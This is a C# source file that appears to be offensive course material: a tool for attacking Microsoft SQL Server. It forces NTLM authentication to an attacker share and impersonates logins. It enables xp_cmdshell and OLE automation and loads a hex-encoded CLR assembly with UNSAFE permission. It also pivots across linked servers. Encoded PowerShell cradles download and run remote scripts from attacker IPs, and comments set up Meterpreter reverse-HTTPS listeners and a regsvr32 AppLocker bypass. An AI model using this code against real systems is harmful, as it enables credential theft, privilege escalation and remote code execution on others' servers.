using System;
using System.Data.SqlClient;

namespace MSSQL
{
    public class Program
    {
        public static String executeQuery(String query, SqlConnection con)
        {
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader reader = cmd.ExecuteReader();
            try
            {
                String result = "";
                while (reader.Read() == true)
                {
                    result += reader[0] + " ";
                }
                reader.Close();
                return result;
            }
            catch
            {
                return "";
            }
        }

        public static void getGroupMembership(String groupToCheck, SqlConnection con)
        {
            String res = executeQuery($"SELECT IS_SRVROLEMEMBER('{groupToCheck}');", con);
            int role = int.Parse(res);
            if (role == 1)
            {
                Console.WriteLine($"[+] User is a member of the '{groupToCheck}' group.");
            }
            else
            {
                Console.WriteLine($"[-] User is not a member of the '{groupToCheck}' group.");
            }
        }

        public static void Main(string[] args)
        {
            String serv = "sql05";
            String db = "master";
            String conStr = $"Server = {serv}; Database = {db}; Integrated Security = True;";
            String res = "";
            SqlConnection con = new SqlConnection(conStr);

            try
            {
                con.Open();
                Console.WriteLine("[+] Authenticated to MSSQL Server!");
            }
            catch
            {
                Console.WriteLine("[-] Authentication failed.");
                Environment.Exit(0);
            }

            //// Enumerate login info
            //String login = executeQuery("SELECT SYSTEM_USER;", con);
            //Console.WriteLine($"[*] Logged in as: {login}");
            //String uname = executeQuery("SELECT USER_NAME();", con);
            //Console.WriteLine($"[*] Database username: {uname}");
            //getGroupMembership("public", con);
            //getGroupMembership("sysadmin", con);

            // Force NTLM authentication for hash-grabbing or relaying
            // Remember to disable SMB on kali
            String targetShare = "\\\\192.168.45.173\\share";
            res = executeQuery($"EXEC master..xp_dirtree \"{targetShare}\";", con);
            Console.WriteLine($"[*] Forced authentication to '{targetShare}'.");

            //// Get logins that we can impersonate
            //res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);
            //Console.WriteLine($"[*] User can impersonate the following logins: {res}.");
            //// alternative (less filter)
            //res = executeQuery("SELECT name, type_desc, default_database_name FROM master.sys.server_principals", con);
            //Console.WriteLine($"[*] User can impersonate the following logins: {res}.");

            //// Impersonate login and get login information
            //String su = executeQuery("SELECT SYSTEM_USER;", con);
            //String un = executeQuery("SELECT USER_NAME();", con);
            //Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
            //res = executeQuery("EXECUTE AS LOGIN = 'sa';", con);
            //Console.WriteLine($"[*] Triggered impersonation.");
            //su = executeQuery("SELECT SYSTEM_USER;", con);
            //un = executeQuery("SELECT USER_NAME();", con);
            //Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");

            //// Impersonate dbo in trusted database and execute through 'xp_cmdshell'
            //// cp OSEP-Code-Snippets/simple_shellcode_runner/simple_shellcode_runner.ps1 run.txt
            //// python3 - m http.server 80
            //// sudo msfconsole -q - x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST tun0; set lport 443; exploit"
            //res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
            //Console.WriteLine("[*] Triggered impersonation.");
            //res = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
            //Console.WriteLine("[*] Enabled 'xp_cmdshell'.");
            //String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA2AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA";
            //res = executeQuery($"EXEC xp_cmdshell '{cmd}'", con);
            //Console.WriteLine($"[*] Executed command! Result: {res}");

            //// Impersonate dbo in trusted database and execute through 'sp_OACreate' 
            //// cp OSEP-Code-Snippets/simple_shellcode_runner/simple_shellcode_runner.ps1 run.txt
            //// python3 - m http.server 80
            //// sudo msfconsole -q - x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST tun0; set lport 443; exploit"
            //res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
            //Console.WriteLine("[*] Triggered impersonation.");
            //res = executeQuery("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", con);
            //Console.WriteLine("[*] Enabled OLE automation procedures.");
            //String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA2AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA";
            //res = executeQuery($"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{cmd}';", con);
            //Console.WriteLine($"[*] Executed command!");

            //// Loading custom assemblies (REQUIRES ESCALATION)
            //// Compile mssql_ca.dll from OSEP-Code-Snippets/mssql_custom_assemblies
            //// run pwsh OSEP-Code-Snippets/mssql_custom_assemblies/dll_to_hextring.ps1
            //// copy and paste output into 'CREATE ASSEMBLY myAssembly FROM 0x4D5A90..."
            //res = executeQuery("use msdb;", con);
            //res = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;", con);
            //res = executeQuery("EXEC sp_configure 'clr enabled', 1; RECONFIGURE;", con);
            //res = executeQuery("EXEC sp_configure 'clr strict security', 0; RECONFIGURE;", con);
            //Console.WriteLine("[*] Disabled CLR strict security.");
            //res = executeQuery("DROP PROCEDURE IF EXISTS [dbo].[cmdExec];", con);
            //res = executeQuery("DROP ASSEMBLY IF EXISTS myAssembly;", con);
            //res = executeQuery("CREATE ASSEMBLY myAssembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000005045000064860200F75F74B00000000000000000F00022200B023000000C00000004000000000000000000000020000000000080010000000020000000020000040000000000000006000000000000000060000000020000000000000300608500004000000000000040000000000000000010000000000000200000000000000000000010000000000000000000000000000000000000000040000068030000000000000000000000000000000000000000000000000000E82900001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000040A000000200000000C000000020000000000000000000000000000200000602E72737263000000680300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000D4080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E000024030000FC03000023537472696E67730000000020070000580000002355530078070000100000002347554944000000880700004C01000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F00000001000000010000000300000000006D02010000000000060097011D03060004021D030600B500EB020F003D0300000600DD00810206007A01810206005B0181020600EB0181020600B70181020600D001810206000A0181020600C900FE020600A700FE0206003E01810206002501360206008F037A020A00F400CA020A0050024C030E007203EB020A006B00CA020E00A102EB02060066027A020A002900CA020A0097001D000A00E103CA020A008F00CA020600B2020A000600BF020A000000000001000000000001000100010010006103000041000100010048200000000096003E00620001000921000000008618E50206000200000001005F000900E50201001100E50206001900E5020A002900E50210003100E50210003900E50210004100E50210004900E50210005100E50210005900E50210006100E50215006900E50210007100E50210007900E50210008900E50206009900E5020600990093022100A90079001000B10088032600A9007A031000A90022021500A900C60315009900AD032C00B900E5023000A100E5023800C90086003F00D100A20344009900B3034A00E10046004F0081005A024F00A10063025300D100EC034400D100500006009900960306009900A10006008100E502060020007B0047012E000B0068002E00130071002E001B0090002E00230099002E002B00A4002E003300A4002E003B00A4002E00430099002E004B00AA002E005300A4002E005B00A4002E006300C2002E006B00EC002E007300F9001A0004800000010000000000000000000000000014000000040000000000000000000000590035000000000004000000000000000000000059001D000000000004000000000000000000000059007A02000000000000003C4D6F64756C653E0053797374656D2E494F006D7373716C5F63610053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E67006D7373716C5F63612E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F770000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F0075007400700075007400000011EB44331F058D419D35F58C6416D9B700042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000A0100054D5353514C000005010000000017010012436F7079726967687420C2A920203230323100002901002431383932313961312D396132612D346230392D386636392D36323037653939393666393400000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3204010000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000000C03000000000000000000000C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0046C020000010053007400720069006E006700460069006C00650049006E0066006F0000004802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D0065000000000000000000340006000100460069006C0065004400650073006300720069007000740069006F006E00000000004D005300530051004C000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061006D00650000006D007300730071006C005F00630061002E0064006C006C00000000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200310000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006D007300730071006C005F00630061002E0064006C006C00000000002C0006000100500072006F0064007500630074004E0061006D006500000000004D005300530051004C000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;", con);
            //res = executeQuery("CREATE PROCEDURE[dbo].[cmdExec] @execCommand NVARCHAR(4000) AS EXTERNAL NAME[myAssembly].[StoredProcedures].[cmdExec];", con);
            //res = executeQuery("EXEC cmdExec 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA2AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA';", con);
            //Console.WriteLine($"[*] Executed command! Result: {res}");

            //// Enumerate linked servers
            //// Important: replace serv with the right SQL server you want to enumerate from
            //serv = "rdc01.corp1.com";
            //db = "master";
            ////conStr = $"Server = {serv}; Database = {db}; Integrated Security = True;";
            //conStr = $"Server = localhost; Database = {db}; Integrated Security = True;";
            //res = "";
            //con = new SqlConnection(conStr);
            //try
            //{
            //    con.Open();
            //    Console.WriteLine("[+] Authenticated to MSSQL Server!");
            //}
            //catch
            //{
            //    Console.WriteLine("[-] Authentication failed.");
            //    Environment.Exit(0);
            //}
            //res = executeQuery("EXEC sp_linkedservers;", con);
            //Console.WriteLine($"[*] Found linked servers: {res}");
            //// select one of the linked servers from the previous output and put into linkedserv/linkedserv_escaped
            ////String linkedserv = "dc01.corp2.com";
            //String linkedserv = "sql53";

            //// Get logins that we can impersonate
            //res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';", con);
            //Console.WriteLine($"[*] User can impersonate the following logins: {res}.");
            //// alternative (less filter)
            //res = executeQuery("SELECT name, type_desc, default_database_name FROM master.sys.server_principals", con);
            //Console.WriteLine($"[*] User can impersonate the following logins: {res}.");


            //// Impersonate login and get login information
            //String su = executeQuery("SELECT SYSTEM_USER;", con);
            //String un = executeQuery("SELECT USER_NAME();", con);
            //Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
            ////res = executeQuery("EXECUTE AS LOGIN = 'sa';", con);
            //res = executeQuery("EXECUTE AS LOGIN = 'webapp11';", con);
            //Console.WriteLine($"[*] Triggered impersonation.");
            //su = executeQuery("SELECT SYSTEM_USER;", con);
            //un = executeQuery("SELECT USER_NAME();", con);
            //Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");

            //// use if you get the error "Server 'SQL03' is not configured for RPC."
            //res = executeQuery("EXEC sp_serveroption 'SQL03', 'rpc out', 'on'; RECONFIGURE;", con);

            //// enumerate linked server
            //res = executeQuery($"EXEC ('select version;') AT \"{linkedserv}\";", con);
            //Console.WriteLine($"[*] Server Version: \n{res}");

            //// Execute commands on linked server (eg OSEP-Code-Snippets/simple_shellcode_runner/simple_shellcode_runner.ps1)
            //// [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("(New-Object System.Net.WebClient).DownloadString('http://192.168.45.166:8000/simple_shellcode_runner.ps1') | IEX"))
            //su = executeQuery("SELECT SYSTEM_USER;", con);
            //Console.WriteLine($"[*] Current system user is '{su}' in database '{serv}'.");
            //su = executeQuery($"EXEC ('select SYSTEM_USER;') AT \"{linkedserv}\";", con);
            //Console.WriteLine($"[*] Current system user is '{su}' in database '{linkedserv}' via 1 link.");
            //res = executeQuery($"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT \"{linkedserv}\";", con);
            //Console.WriteLine($"[*] Enabled advanced options on {linkedserv}.");
            //res = executeQuery($"EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"{linkedserv}\";", con);
            //Console.WriteLine($"[*] Enabled xp_cmdshell option on {linkedserv}.");
            //String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANgA2ADoAOAAwADAAMAAvAHMAaQBtAHAAbABlAF8AcwBoAGUAbABsAGMAbwBkAGUAXwByAHUAbgBuAGUAcgAuAHAAcwAxACcAKQAgAHwAIABJAEUAWAA=";
            //res = executeQuery($"EXEC ('xp_cmdshell ''{cmd}'';') AT \"{linkedserv}\";", con);
            //Console.WriteLine($"[*] Triggered command. Result: {res}");

            //// enumerate linked server (openquery version)
            //res = executeQuery($"select version from openquery(\"{linkedserv}\", 'select @@version as version');", con);
            //Console.WriteLine($"[*] Server Version: \n{res}");

            //// Execute on linked server via 'openquery' (eg OSEP-Code-Snippets/simple_shellcode_runner/simple_shellcode_runner.ps1)
            //// [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("(New-Object System.Net.WebClient).DownloadString('http://192.168.45.166:8000/simple_shellcode_runner.ps1') | IEX"))
            //su = executeQuery("SELECT SYSTEM_USER;", con);
            //Console.WriteLine($"[*] Current system user is '{su}' in database '{serv}'.");
            //su = executeQuery($"select mylogin from openquery(\"{linkedserv}\", 'select SYSTEM_USER as mylogin');", con);
            //Console.WriteLine($"[*] Current system user is '{su}' in database '{linkedserv}' via 1 link.");
            //res = executeQuery($"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT \"{linkedserv}\";", con);
            //res = executeQuery($"select 1 from openquery(\"{linkedserv}\", 'select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure');", con);
            //Console.WriteLine($"[*] Enabled advanced options on {linkedserv}.");
            //res = executeQuery($"select 1 from openquery(\"{linkedserv}\", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure');", con);
            //Console.WriteLine($"[*] Enabled xp_cmdshell options on {linkedserv}.");
            ////String cmd = "regsvr32 /s /n /u /i:http://192.168.85.128:8080/yCgDH0pUm scrobj.dll"; // applocker bypass variant
            //String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA2AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA";
            //res = executeQuery($"select 1 from openquery(\"{linkedserv}\", 'select 1; exec xp_cmdshell ''{cmd}''');", con);
            //Console.WriteLine($"[*] Triggered Meterpreter oneliner on {linkedserv}. Check your listener!");

            //// Escalate via double database linked
            //res = executeQuery($"EXEC('sp_linkedservers') AT \"{linkedserv}\";", con);
            //Console.WriteLine($"[*] Found linked servers: {res}");
            //su = executeQuery("SELECT SYSTEM_USER;", con);
            //Console.WriteLine($"[*] Current system user is '{su}' in database '{serv}'.");
            //su = executeQuery($"select mylogin from openquery(\"{linkedserv}\", 'select SYSTEM_USER as mylogin');", con);
            //Console.WriteLine($"[*] Current system user is '{su}' in database '{linkedserv}' via 1 link.");
            //su = executeQuery($"select mylogin from openquery(\"{linkedserv}\", 'select mylogin from openquery(\"{serv}\", ''select SYSTEM_USER as mylogin'')');", con);
            //Console.WriteLine($"[*] Current system user is '{su}' in database '{serv}' via 2 links.");
            //res = executeQuery($"EXEC('sp_linkedservers') AT \"{linkedserv}\";", con);
            //// Execute through 'xp_cmdshell' via double database linked
            //res = executeQuery($"EXEC('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT \"{serv}\"') AT \"{linkedserv}\";", con);
            //res = executeQuery($"EXEC('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT \"{serv}\"') AT \"{linkedserv}\";", con);
            //String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA2AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA";
            //res = executeQuery($"EXEC('EXEC (''xp_cmdshell ''''{cmd}'''''') AT \"{serv}\"') AT \"{linkedserv}\";", con);
            //Console.WriteLine($"[*] Executed command! Result: {res}");
        }
    }
}